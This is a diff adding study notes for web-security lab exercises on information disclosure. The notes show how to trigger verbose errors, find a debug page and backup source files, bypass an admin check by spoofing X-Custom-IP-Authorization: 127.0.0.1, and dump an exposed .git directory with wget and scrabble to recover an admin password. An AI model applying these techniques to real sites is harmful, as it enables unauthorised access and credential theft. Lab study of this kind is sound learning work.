@@ -1,0 +1,128 @@
+
+#Information Disclosure#
+	
+	
+		[Information disclosure in error messages]
+		
+			GET /product?productId=1			|| this url returns integer vaule
+			GET /product?productId=examples		|| pass string replacing integer value then find output of error messages
+			
+			
+			
+		[Information Disclosure on Debug Page]
+
+			go to the Target > Site Map tab.. right-click on the top-level entry for the lab and select "Engagement tools" > "Find comments".. 			
+			notice that the home page contains an HTML comment that contains a link called "Debug". This points to /cgi-bin/phpinfo.php..
+
+			In the site map, right-click on the entry for /cgi-bin/phpinfo.php and select "Send to Repeater".
+			
+			
+			
+		[Source code disclosure via backup files]
+				
+			browse to /robots.txt and notice that it reveals the existence of a /backup directory. browse to /backup to find the file ProductTemplate.java.bak. 
+				alternatively, right-click on the lab in the site map and go to "Engagement tools" > "Discover content". Then, launch a content discovery session to discover the /backup directory and its contents.
+	
+			browse to /backup/ProductTemplate.java.bak to access the source code. In the source code, notice that the connection builder contains the hard-coded password for a Postgres database.
+
+
+		
+		[Authentication bypass via information disclosure]
+			
+			 browse to GET /admin. the response discloses that the admin panel is only accessible if logged in as an administrator or if requested from a local IP.
+				Send the request again, but this time use the TRACE method-
+						TRACE /admin
+			
+			notice that the "X-Custom-IP-Authorization" header that containing your IP address was automatically appended to your request. 
+				this is used to determine whether or not the request came from the localhost IP address.
+					
+	
+			Go to "Proxy" > "Options", scroll down to the "Match and Replace" section, and click "Add". Leave the match condition blank, but in the "Replace" field, enter:
+				X-Custom-IP-Authorization: 127.0.0.1
+			
+			Burp Proxy will now add this header to every request you send.
+
+			Browse to the home page. Notice that you now have access to the admin panel.
+			
+			
+		
+		
+		[Information disclosure in version control history]
+			
+			download the site from github repo. 
+			
+			wget -r https://0a27006603a12135c0120edc004300f9.web-security-academy.net/.git/
+			
+				ls -a
+				.  ..  .git
+				
+				cd .git
+				
+				ls
+					branches  COMMIT_EDITMSG  config  description  HEAD  hooks  index  index.html  info  logs  objects  refs
+				
+				cat HEAD
+				ref: refs/heads/master
+				
+				cat refs/heads/master
+				2bca53f00f886f3f12669738870412eb0b11b400
+				
+				
+				git cat-file -p 2bca53f00f886f3f12669738870412eb0b11b400
+					tree 2154555944002791a4d27412bf6e9a6f29e942fa
+					parent f1a2df2d678f31133a4e0cc5d0dcc783c93c798c
+					author Carlos Montoya <carlos@evil-user.net> 1592921107 +0000
+					committer Carlos Montoya <carlos@evil-user.net> 1677142542 +0000
+				
+				git cat-file -p 2bca53f00f886f3f12669738870412eb0b11b400
+					tree 2154555944002791a4d27412bf6e9a6f29e942fa
+					parent f1a2df2d678f31133a4e0cc5d0dcc783c93c798c
+					author Carlos Montoya <carlos@evil-user.net> 1592921107 +0000
+					committer Carlos Montoya <carlos@evil-user.net> 1677142542 +0000
+				
+				git cat-file -p 2154555944002791a4d27412bf6e9a6f29e942fa
+				100644 blob 21d23f13ce6c704b81857379a3e247e3436f4b26    admin.conf
+				100644 blob 8944e3b9853691431dc58d5f4978d3940cea4af2    admin_panel.php
+				
+				
+				git cat-file -p 21d23f13ce6c704b81857379a3e247e3436f4b26
+					ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+				
+		
+		
+		Note: Passowrd is stored into Enviroment Varible. So we will have to use <Scrabble>
+				
+		
+		git clone https://github.com/denny0223/scrabble
+			cd scrabble
+				./scrabble https://0a27006603a12135c0120edc004300f9.web-security-academy.net
+				
+			ls
+				admin.conf  admin_panel.php
+			
+			cat admin.conf
+				ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+			
+			git log
+				commit 2bca53f00f886f3f12669738870412eb0b11b400 (HEAD -> master)
+				Author: Carlos Montoya <carlos@evil-user.net>
+				Date:   Tue Jun 23 14:05:07 2020 +0000
+				
+					Remove admin password from config
+				
+				commit f1a2df2d678f31133a4e0cc5d0dcc783c93c798c
+				Author: Carlos Montoya <carlos@evil-user.net>
+				Date:   Mon Jun 22 16:23:42 2020 +0000
+				
+					Add skeleton admin panel
+
+			
+			git reset HEAD^ --hard
+				HEAD is now at f1a2df2 Add skeleton admin panel
+
+
+			cat admin.conf
+				ADMIN_PASSWORD=8mydtylzn5qu8q1reg6l
+
+
+			
